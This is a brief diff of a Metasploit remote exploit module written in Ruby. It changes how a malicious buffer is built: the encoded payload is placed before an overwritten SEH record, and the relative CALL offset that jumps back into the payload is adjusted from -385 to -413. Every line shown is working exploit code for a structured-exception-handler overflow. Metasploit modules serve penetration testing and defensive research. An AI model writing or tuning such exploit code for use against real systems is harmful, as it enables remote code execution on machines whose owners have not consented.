@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Exploit::Remote
     file = rand_text_alpha_upper(0xfff)
     file[747 - payload.encoded.size, payload.encoded.size] = payload.encoded
     file[747, seh.size] = seh 
-    file[747 + seh.size, 5] = [0xe8, -385].pack('CV')
+    file[747 + seh.size, 5] = [0xe8, -413].pack('CV')
     file << "\x00"
     pkt_size = local_filedata.size() + file.size() + (0xffff - file.size()) + 4
 
